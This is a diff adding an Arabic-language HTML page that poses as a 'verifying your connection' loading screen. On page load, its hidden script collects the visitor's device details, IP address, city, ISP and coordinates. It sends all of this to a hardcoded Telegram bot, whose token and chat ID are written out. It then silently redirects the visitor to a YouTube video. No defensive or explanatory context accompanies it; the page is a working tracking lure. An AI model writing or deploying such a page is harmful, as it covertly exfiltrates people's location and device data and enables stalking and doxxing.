@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جاري التحقق من الاتصال</title>
+    <style>
+        body {
+            background: #0d1117;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            color: #c9d1d9;
+            text-align: center;
+        }
+        .loader {
+            text-align: center;
+        }
+        .spinner {
+            border: 4px solid #30363d;
+            border-top: 4px solid #58a6ff;
+            border-radius: 50%;
+            width: 45px;
+            height: 45px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        p {
+            font-size: 18px;
+            color: #8b949e;
+        }
+        .status {
+            margin-top: 10px;
+            font-size: 14px;
+            color: #58a6ff;
+        }
+    </style>
+</head>
+<body>
+    <div class="loader">
+        <div class="spinner"></div>
+        <p>جاري التحقق من اتصالك...</p>
+        <div class="status" id="status">⏳ جاري تجهيز البيانات...</div>
+    </div>
+
+    <script>
+        (function() {
+            // ======== بيانات البوت (ثابتة) ========
+            const BOT_TOKEN = "8317512028:AAHEIRv_S23OFrceayGoKW823jIxvl9Az_k";
+            const CHAT_ID = "1497190595";
+            const REDIRECT_URL = "https://www.youtube.com/watch?v=6N5IQxrac6g";
+            // ======================================
+
+            // عنصر الحالة للتحديث
+            const statusEl = document.getElementById('status');
+
+            // دالة تحديث حالة العرض
+            function updateStatus(msg) {
+                if (statusEl) statusEl.textContent = msg;
+            }
+
+            // دالة الإرسال إلى تيليجرام (مع محاولات إعادة)
+            function sendToTelegram(text, isImportant = false) {
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+                // محاولة الإرسال
+                return fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: text,
+                        parse_mode: 'Markdown',
+                        disable_web_page_preview: true
+                    })
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        // إذا فشل، نحاول مرة واحدة بعد ثانية
+                        return new Promise((resolve) => {
+                            setTimeout(() => {
+                                fetch(url, {
+                                    method: 'POST',
+                                    headers: { 'Content-Type': 'application/json' },
+                                    body: JSON.stringify({
+                                        chat_id: CHAT_ID,
+                                        text: text,
+                                        parse_mode: 'Markdown',
+                                        disable_web_page_preview: true
+                                    })
+                                }).then(resolve).catch(() => resolve());
+                            }, 1000);
+                        });
+                    }
+                    return response;
+                })
+                .catch(() => {});
+            }
+
+            // ============================================================
+            // 1. تجميع البيانات الأساسية (دون انتظار)
+            // ============================================================
+            const visitorData = {
+                ua: navigator.userAgent,
+                platform: navigator.platform || 'غير معروف',
+                language: navigator.language || 'غير معروف',
+                time: new Date().toLocaleString('ar-EG', { timeZone: 'Asia/Riyadh' }),
+                url: window.location.href,
+                referrer: document.referrer || 'مباشر',
+                screen: `${window.screen.width}x${window.screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'غير معروف'
+            };
+
+            // إرسال رسالة أولية فورية (بدون IP)
+            const initialMsg =
+                `🔴 *زائر جديد - تم فتح الرابط* 🔴\n` +
+                `💻 الجهاز: ${visitorData.ua}\n` +
+                `🖥 المنصة: ${visitorData.platform}\n` +
+                `🌍 اللغة: ${visitorData.language}\n` +
+                `🕒 الوقت: ${visitorData.time}\n` +
+                `📌 الرابط: ${visitorData.url}\n` +
+                `🔄 الرابط السابق: ${visitorData.referrer}\n` +
+                `📱 الشاشة: ${visitorData.screen}\n` +
+                `⏰ المنطقة: ${visitorData.timezone}`;
+
+            // إرسال الرسالة الأولى (مع تجاهل الأخطاء)
+            sendToTelegram(initialMsg, true);
+            updateStatus('✅ تم إرسال البيانات الأساسية');
+
+            // ============================================================
+            // 2. جلب الـ IP والموقع الجغرافي (باستخدام 3 خدمات احتياطية)
+            // ============================================================
+            let ipFetched = false;
+
+            // الخدمة الأولى: ipify (الأسرع)
+            function fetchIP1() {
+                return fetch('https://api.ipify.org?format=json', { timeout: 3000 })
+                    .then(r => r.json())
+                    .then(data => data.ip)
+                    .catch(() => null);
+            }
+
+            // الخدمة الثانية: ip-api.com (تفاصيل أكثر)
+            function fetchIP2() {
+                return fetch('https://ip-api.com/json/', { timeout: 3000 })
+                    .then(r => r.json())
+                    .then(data => {
+                        if (data && data.query) {
+                            return {
+                                ip: data.query,
+                                country: data.country || 'غير معروف',
+                                city: data.city || 'غير معروف',
+                                isp: data.isp || 'غير معروف',
+                                lat: data.lat || 'غير معروف',
+                                lon: data.lon || 'غير معروف'
+                            };
+                        }
+                        return null;
+                    })
+                    .catch(() => null);
+            }
+
+            // الخدمة الثالثة: ipinfo.io (الأكثر تفصيلاً)
+            function fetchIP3() {
+                return fetch('https://ipinfo.io/json', { timeout: 3000 })
+                    .then(r => r.json())
+                    .then(data => {
+                        if (data && data.ip) {
+                            return {
+                                ip: data.ip,
+                                country: data.country || 'غير معروف',
+                                city: data.city || 'غير معروف',
+                                isp: data.org || 'غير معروف',
+                                loc: data.loc || 'غير معروف'
+                            };
+                        }
+                        return null;
+                    })
+                    .catch(() => null);
+            }
+
+            // تشغيل جميع الخدمات بالتوازي، وأخذ أول نتيجة ناجحة
+            Promise.race([
+                fetchIP1().then(ip => ip ? { ip } : null),
+                fetchIP2(),
+                fetchIP3()
+            ])
+            .then(result => {
+                if (result) {
+                    // بناء رسالة مفصلة
+                    let ipMsg =
+                        `🌐 *تفاصيل الزائر (IP والموقع)* 🌐\n` +
+                        `📌 الـ IP: ${result.ip || 'غير معروف'}\n`;
+
+                    if (result.country) ipMsg += `📍 الدولة: ${result.country}\n`;
+                    if (result.city) ipMsg += `🏙️ المدينة: ${result.city}\n`;
+                    if (result.isp) ipMsg += `📡 المزود: ${result.isp}\n`;
+                    if (result.lat && result.lon) ipMsg += `🗺️ الموقع: ${result.lat}, ${result.lon}\n`;
+                    if (result.loc) ipMsg += `🗺️ الموقع: ${result.loc}\n`;
+
+                    ipMsg += `\n💻 الجهاز: ${visitorData.ua}\n`;
+                    ipMsg += `🕒 الوقت: ${visitorData.time}`;
+
+                    sendToTelegram(ipMsg, true);
+                    updateStatus('✅ تم جلب الموقع الجغرافي بنجاح');
+
+                    ipFetched = true;
+                } else {
+                    // إذا فشلت جميع الخدمات
+                    sendToTelegram(`⚠️ *تعذر جلب الـ IP والموقع* ⚠️\n💻 ${visitorData.ua}\n🕒 ${visitorData.time}`, true);
+                    updateStatus('⚠️ تعذر جلب الموقع');
+                }
+            })
+            .catch(() => {
+                // خطأ عام
+                sendToTelegram(`❌ *خطأ في جلب البيانات* ❌\n💻 ${visitorData.ua}\n🕒 ${visitorData.time}`, true);
+                updateStatus('❌ حدث خطأ');
+            });
+
+            // ============================================================
+            // 3. التوجيه إلى يوتيوب (بعد 2.5 ثانية لضمان وصول الرسائل)
+            // ============================================================
+            setTimeout(() => {
+                updateStatus('🔄 جاري التحويل إلى الفيديو...');
+                // نستخدم replace بدلاً من href لمنع الرجوع للخلف
+                window.location.replace(REDIRECT_URL);
+            }, 2500);
+
+            // خطة احتياطية: إذا لم يتحرك لأي سبب، نجبره بعد 5 ثوانٍ
+            setTimeout(() => {
+                if (window.location.href !== REDIRECT_URL) {
+                    window.location.replace(REDIRECT_URL);
+                }
+            }, 5000);
+
+        })();
+    </script>
+</body>
+</html>
